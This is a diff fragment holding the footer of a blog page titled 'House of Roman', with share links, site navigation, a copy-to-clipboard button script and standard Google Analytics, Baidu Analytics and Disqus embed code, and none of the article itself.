+  <li><a class="icon" href="mailto:?subject=House of Roman&body=Check out this article: https://bestwing.me/house_of_roman.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/house_of_roman.html&name=House of Roman&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/house_of_roman.html&t=House of Roman"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
